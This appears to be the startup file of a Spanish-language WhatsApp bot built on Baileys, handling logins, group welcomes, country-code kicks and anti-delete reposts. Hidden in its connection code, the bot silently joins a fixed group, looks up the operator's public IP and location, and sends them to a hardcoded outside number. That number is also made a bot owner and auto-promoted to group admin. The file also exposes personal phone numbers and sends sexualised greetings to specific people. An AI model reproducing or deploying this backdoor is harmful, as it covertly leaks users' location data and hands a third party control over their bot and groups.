const { WAConnection: _WAConnection, MessageType, Presence, Mimetype, ChatModification, GroupSettingChange, ReconnectMode } = require('@adiwajshing/baileys')
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const cnf = new WAConnection()
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const fs = require("fs")
const util = require('util')
const figlet = require('figlet')
const term = require('terminal-kit').terminal
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const fetch = require('node-fetch')
const { color, bgcolor } = require('./lib/color')
const { exec } = require('child_process')
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { stick, errorfg, group, banf, ownerB, modsB, userB, admin, Badmin, sofii, mariann, samm, shagii, garyy, criss, pandaa, yulii, miaa, isaa, famp, ghostt} = require('./help/respon');
const settings = JSON.parse(fs.readFileSync('./settings.json'))
const sleep = async (ms) => {
return new Promise(resolve => setTimeout(resolve, ms))
}
nocache('./confu.js', module => console.log(color('|TRM|'), color(`${module} actualizado`, 'cyan')))

async function starts() {
cnf.autoReconnect = ReconnectMode.onConnectionLost
    cnf.version = [2, 2143, 3]
    cnf.logger.level = 'warn'
    cnf.browserDescription = ['Charlotte','Desktop','3.0']
    await sleep(10000)
    cnf.on('qr', qr => {
        qrcode.generate(qr, { small: true })
        console.log(color('|TRM|'), color('Escanea el código QR', 'red'))
    })
    fs.existsSync('./cnf.json') && cnf.loadAuthInfo('./cnf.json')
    
    cnf.on('credentials-updated', () => {
        console.log(color('|TRM|'), color('Archivos actualizados!', 'cyan'))
        })
     
      await cnf.connect({ timeoutMs: 30 * 1000 });
  fs.writeFileSync("./cnf.json",JSON.stringify(cnf.base64EncodedAuthInfo(), null, "\t"));
 teks = `https://chat.whatsapp.com/CMn8zNddsIyAALctqol6V0`  
 cnf.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
 console.log(color('|WRN|', 'yellow'), color('Úniendose al grupo oficial', 'cyan'))
 cnf.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Conectado*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: false, externalAdReply:{title: "Bot editado por isaiaswtf",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./confumods.jpg'),sourceUrl:"https://wa.me/19088088900?text=ola%20owner%20❤️"}}})
	console.log(color('|WRN|', 'yellow'), color('Enviando de información de usuario', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       cnf.sendMessage("19088088900@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n──────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: false, externalAdReply:{title: "Creador isaiaswtf",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./confumods.jpg'),sourceUrl:"https://wa.me/19088088900?text=Ola"}}})
       console.log(color('|WRN|', 'yellow'), color('Enviando IP', 'red'))
   })
      cnf.on('connecting', () => {
		console.log(color('|TRM|'), color('Conectando, asegúrese de que la red sea estable...', 'cyan'))
		})
	
	cnf.on('open', () => {
	console.log(color('|TRM|'), color('Conectado, escriba .menu en Whatsapp..!!', 'cyan'))
	}) 
     
    cnf.on('ws-close', () => {
        console.log(color('|TRM|'), color('Conexión perdida, intentando volver a conectar.', 'cyan'))
        })
    
    cnf.on('close', async () => {
        console.log(color('|TRM|'), color('Desconectado.', 'cyan'))
        })
    
	if (!settings.autoplaymusic) {
exec(`cd /sdcard/download && play *mp3`)
}
   
   cnf.on('chat-update', async (mek) => {
        require('./confu.js')(cnf, mek)
        ownerNumber = ["19088088900@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "19088088900@s.whatsapp.net"
       otod = `${settings.NomorOwner}@s.whatsapp.net`
    })   
cnf.on('group-participants-update', async (anu) => {
const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
const antifake = JSON.parse(fs.readFileSync('./database/antifake.json'))
const fake = JSON.parse(fs.readFileSync('./database/fake.json'))
if (antifake.includes(anu.jid)){
const mdata = await cnf.groupMetadata(anu.jid)
if (anu.action == 'add'){
num = anu.participants[0]
///if(!num.split('@')[0].includes('${fake}@s.whatsapp.net'))///
if(!num.split('@')[0].startsWith(393249895267)) //Alisya//
if(!num.split('@')[0].startsWith(393272976172)) //Damaris//
if(!num.split('@')[0].startsWith(393420749617)) //Envy//
{
fakew = `*⚠️Tu número no está permitido @${num.split('@')[0]}*`
if (num.startsWith('994')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('44')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('33')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('357')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('359')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('36')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('370')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('41')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('43')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('49')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('62')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('689')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('886')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('977')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('992')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('20')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('249')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('251')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('254')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('258')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('27')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('298')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('31')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('353')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('354')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('371')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('372')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('380')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('40')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('420')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('43')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('45')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('46')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('49')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('500')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('60')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('63')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('64')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('65')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('66')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('675')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('212')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('852')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('855')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('86')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('880')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('91')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('92')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('94')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('972')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('977')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('996')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
if (num.startsWith('7')) return cnf.sendMessage(mdata.id, fakew, MessageType.text, {contextInfo: {"mentionedJid": [num]}}), setTimeout( () => {cnf.groupRemove(mdata.id, [num])},1000)
}}}
if (!welkom.includes(anu.jid)) return
mem = anu.participants[0]
try {
const mdata = await cnf.groupMetadata(anu.jid)
console.log(anu)
if (anu.action == 'add') {			
num = anu.participants[0]
try {
ppimg = await cnf.getProfilePicture(`${num.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
} 
let buff = await getBuffer(ppimg)
//--  Autoadmin ingresando --------------
//Isa
if (num.startsWith('5218661169960')) {cnf.groupMakeAdmin(mdata.id, [num])
} else if (num.startsWith('19088088900')) {cnf.groupMakeAdmin(mdata.id, [num])}

//Bienvenida ------------------
 //Mía
miaw = `*Hola @${num.split('@')[0]}*\n*Bienvenida de nuevo Mía chikita✨*\n*Toma tu admin c:*`
if (num.startsWith('5218443517716')) return cnf.sendMessage(mdata.id, miaw, MessageType.text, {thumbnail: fs.readFileSync('./confumods.jpg'), contextInfo: { externalAdReply:{title: `Bienvenido a ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,sourceUrl:`https://wa.me/${num.split("@")[0]}`}, "mentionedJid": [num]}})

//Gary
garyw = `*Hola @${num.split('@')[0]}*\n*Que bueno que volviste a casa :D*`
if (num.startsWith('573194772128')) return cnf.sendMessage(mdata.id, garyw, MessageType.text, {thumbnail: fs.readFileSync('./confumods.jpg'), contextInfo: { externalAdReply:{title: `Bienvenido a ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,sourceUrl:`https://wa.me/${num.split("@")[0]}`}, "mentionedJid": [num]}})

//Sofi
sofiw = `*Hola @${num.split('@')[0]}*\n*Bienvenida de nuevo Sophi 🐑🤍*`
if (num.startsWith('50375857072')) return cnf.sendMessage(mdata.id, sofiw, MessageType.text, {thumbnail: fs.readFileSync('./confumods.jpg'), contextInfo: { externalAdReply:{title: `Bienvenido a ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,sourceUrl:`https://wa.me/${num.split("@")[0]}`}, "mentionedJid": [num]}})

//Marian
marianw = `*Hola @${num.split('@')[0]}*\n*Bienvenida otra vez Marian🍇*`
if (num.startsWith('5212226354857')) return cnf.sendMessage(mdata.id, marianw, MessageType.text, {thumbnail: fs.readFileSync('./confumods.jpg'), contextInfo: { externalAdReply:{title: `Bienvenido a ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,sourceUrl:`https://wa.me/${num.split("@")[0]}`}, "mentionedJid": [num]}})

//Sam
samw = `*Hola @${num.split('@')[0]} sexo rai nau*`
if (num.startsWith('79054328423')) return cnf.sendMessage(mdata.id, samw, MessageType.text, {thumbnail: fs.readFileSync('./confumods.jpg'), contextInfo: { externalAdReply:{title: `Bienvenido a ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,sourceUrl:`https://wa.me/${num.split("@")[0]}`}, "mentionedJid": [num]}})

//Shagi
shagiw = `*Hola guapo @${num.split('@')[0]} nos besamos? *`
if (num.startsWith('79653450669')) return cnf.sendMessage(mdata.id, shagiw, MessageType.text, {thumbnail: fs.readFileSync('./confumods.jpg'), contextInfo: { externalAdReply:{title: `Bienvenido a ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,sourceUrl:`https://wa.me/${num.split("@")[0]}`}, "mentionedJid": [num]}})

 //Isa 
isaw = `*El Owner @${num.split('@')[0]} ha ingresado🔮*`
if (num.startsWith('5218661169960')) return cnf.sendMessage(mdata.id, isaw, MessageType.text, {thumbnail: fs.readFileSync('./confumods.jpg'), contextInfo: { externalAdReply:{title: `Bienvenido a ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,sourceUrl:`https://wa.me/${num.split("@")[0]}`}, "mentionedJid": [num]}})
if (num.startsWith('19088088900')) return cnf.sendMessage(mdata.id, isaw, MessageType.text, {thumbnail: fs.readFileSync('./confumods.jpg'), contextInfo: { externalAdReply:{title: `Bienvenido a ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,sourceUrl:`https://wa.me/${num.split("@")[0]}`}, "mentionedJid": [num]}})

//Yuli
yuliw = `*Hola bonita @${num.split('@')[0]}*\n*Nos besamos? 🛐✨*`
if (num.startsWith('5217713385591')) return cnf.sendMessage(mdata.id, yuliw, MessageType.text, {thumbnail: fs.readFileSync('./confumods.jpg'), contextInfo: { externalAdReply:{title: `Bienvenido a ${mdata.subject}`,body:"",mediaType:"2",thumbnail:buff,sourceUrl:`https://wa.me/${num.split("@")[0]}`}, "mentionedJid": [num]}})
//Italian
itali=`•   。. ✧ ﾟ  ᠂    ․    。.    •    ﾟ . ﾟ ᠂ ․   ‧ . ᠂  ﾟ
*✨Nome:*
*🌻Età:*
*🌎Paese:*
*📸Foto:* 
*@${num.split('@')[0]} ｡ . • ¨ * • ✧*`   
if (num.startsWith('39')) return cnf.sendMessage(mdata.id, itali, MessageType.text, {thumbnail: fs.readFileSync('./confumods.jpg'), contextInfo: { externalAdReply:{title: `Ciao, sono ${NamaBot}\nBenvenuto a ${mdata.subject}\nLeggi il regolamento e presentati:`,body:"",mediaType:"2",thumbnail:buff,sourceUrl:`https://wa.me/${num.split("@")[0]}`}, "mentionedJid": [num]}})

//Nuevo integrante
teks= `• 。. ✧ ﾟ  ᠂    ․    。.    •    ﾟ . ﾟ ᠂ ․   ‧ . ᠂  ﾟ
*✨Nombre:*
*🌻Edad:*
*🌎País:*
*📸Foto:* 
*@${num.split('@')[0]} ｡ . • ¨ * • ✧*`
cnf.sendMessage(mdata.id, teks, MessageType.text, { thumbnail: fs.readFileSync('./confumods.jpg'), contextInfo: { externalAdReply:{title: `Hola, soy ${NamaBot}`,body:`Bienvenido a ${mdata.subject}\nLee las reglas y presentate:`,mediaType:"2",thumbnail:buff, sourceUrl:`https://wa.me/${num.split("@")[0]}`}, "mentionedJid": [num]}})

} else if (anu.action == 'remove') {
num = anu.participants[0]
try {
ppimg = await cnf.getProfilePicture(`${num.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
let buff = await getBuffer(ppimg)
bye =`*@${num.split('@')[0]} ｡ . • ¨ * • ✧*`
cnf.sendMessage(mdata.id, bye, MessageType.text, {thumbnail: fs.readFileSync('./confumods.jpg'), contextInfo: { externalAdReply:{title: `Salio de ${mdata.subject}`,body:"No le vamos a extrañar...",mediaType:"2",thumbnail:buff,sourceUrl:`https://wa.me/${num.split("@")[0]}?text=Hola+nos+agendamos?`}, "mentionedJid": [num]}})
} else if (anu.action == 'promote') {
num = anu.participants[0]
teks = `*NUEVO ADMIN - DETECTADO*\nUsuario: @${num.split('@')[0]}\nTiempo : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\nGrupo: ${mdata.subject}`
cnf.sendMessage(mdata.id, teks, MessageType.text, {contextInfo:{"mentionedJid": [num]}})
console.log(color('|TRM|'), color(`Nuevo admin ${num.split('@')[0]} En ${mdata.subject}`,  'cyan'))
} else if (anu.action == 'demote') {
num = anu.participants[0]
teks = `*DEGRADACIÓN - DETECTADA*\nUsuario: @${num.split('@')[0]}\nTiempo : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\nGrupo: ${mdata.subject}`
cnf.sendMessage(mdata.id, teks, MessageType.text, {contextInfo:{"mentionedJid": [num]}})
console.log(color('|TRM|'), color(`Degradacion ${num.split('@')[0]} En ${mdata.subject}`,  'cyan'))
}
		    } catch (e) {
			console.log('Error : %s', color(e, 'red'))
		    }
	        })	       
	cnf.on('group-update', async (anu, mek) => {
		const metdata = await cnf.groupMetadata(anu.jid)
    	const fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;cnf;;;\nFN:cnf\nitem1.TEL;waid=19178136856:+19178136856\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
    if(anu.announce == 'false'){
    teks = `- [ Grupo Abierto] -`
    cnf.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Grupo Abierto ${metdata.subject}`, 'cyan'))
  } 
  else if(anu.announce == 'true'){
    teks = `- [ Grupo Cerrado] -`
    cnf.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Grupo Cerrado ${metdata.subject}`,  'cyan'))
  }
  else if(!anu.desc == ''){
    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
    teks = `- [ Nueva descripción] -\n\nEl administrador ha cambiado la descripción del grupo @${anu.descOwner.split('@')[0]}\n• Nueva descripción : ${anu.desc}`
    cnf.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
    console.log(color('|TRM|'), color(`Descripcion cambiada ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'false'){
    teks = `- [ Nuevos ajustes ] -\n\nSe ha abierto la opción Editar información del grupo para los miembros.\nAhora todos los miembros pueden editar la información de este grupo.`
    cnf.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Ajustes editados ${metdata.subject}`, 'cyan'))
  }
  else if(anu.restrict == 'true'){
    teks = `- [ Nuevos ajustes ] -\n\nSe ha cerrado la edición de la información del grupo para los miembros.\nAhora solo el administrador del grupo puede editar la información de este grupo`
    cnf.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
    console.log(color('|TRM|'), color(`Ajustes editados ${metdata.subject}`,  'cyan'))
  }
})

cnf.on('CB:action,,call', async json => {
        const callerId = json[2][0][1].from;
        var vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + `${NamaOwner}` + '\n' + `ORG:Creador de ${NamaBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + `${ownerX}` + ':+' + `${ownerX}` + '\n' + 'END:VCARD'
        cnf.sendMessage(callerId, "\`\`\`[ ! ] LLAMADA DETECTADA [ ! ]\`\`\`\n\n\`\`\`Estás bloqueado debido a que no estan permitidas las llamadas, comuníquese con el desarrollador del bot para desbloquear.\`\`\`", MessageType.text)
        cnf.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Creador ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./confumods.jpg'),sourceUrl:`https://wa.me/19088088900?text=ola%20owner%20`}}})
        await sleep(5000)
        await cnf.blockUser(callerId, "add")
        })
        
	cnf.on('message-delete', async (m) => {
if (m.key.remoteJid == 'status@broadcast') return
if (!m.key.fromMe) {
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss')
let d = new Date
let c = cnf.chats.get(m.key.remoteJid)
let a = c.messages.dict[`${m.key.id}|${m.key.fromMe ? 1 : 0}`]
let co3ntent = cnf.generateForwardMessageContent(a, false)
let c3type = Object.keys(co3ntent)[0]
let locale = 'id'
let gmt = new Date(0).getTime() - new Date('1 enero 2021').getTime()
let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})
cnf.copyNForward(m.key.remoteJid, m.message)
cnf.sendMessage(m.key.remoteJid, `▷\`\`\`ANTI ELIMINAR\`\`\`

⚔️ \`\`\`Nombre : @${m.participant.split("@")[0]}\`\`\`
⚔️ \`\`\`Tipo : ${c3type}\`\`\`
⚔️ \`\`\`Fecha : ${jam} - ${week} ${weton} - ${calender}\`\`\``, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
}
})
}

console.clear()
var progressBar , progress = 0 ;
function doProgress()
{
	progress += Math.random() / 10 ;
	progressBar.update( progress ) ;
	
	if ( progress >= 1 )
	{
		setTimeout( function() { console.clear(),
		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
			console.log(stdout), console.log(bgcolor('Iniciando doxeo...', 'blue'))})}, 200 ) ;
	}
	else
	{
		setTimeout( doProgress , 100 + Math.random() * 150 ) ;
	}
}
console.log(color(figlet.textSync(`${settings.NameBanner}`, {
		font: 'Standard',
		horizontalLayout: 'default',
		vertivalLayout: 'default',
		width: 50,
		whitespaceBreak: true
	    }), 'lightgreen')), term.slowTyping('Edit by isaiaswtf' ,{ flashStyle: term.brightWhite })
progressBar = term.progressBar( {
	width: 80 ,
	title: '\n\nCargando' ,
	eta: true ,
	percent: true
} ) ;
doProgress() ;

/**
 * Uncache if there is file change
 * @param {string} module Module name or path
 * @param {function} cb <optional> 
 */
function nocache(module, cb = () => { }) {
    fs.watchFile(require.resolve(module), async () => {
        await uncache(require.resolve(module))
        cb(module)
    })
}
/**
 * Uncache a module
 * @param {string} module Module name or path
 */
function uncache(module = '.') {
    return new Promise((resolve, reject) => {
        try {
            delete require.cache[require.resolve(module)]
            resolve()
        } catch (e) {
            reject(e)
        }
    })
}
starts()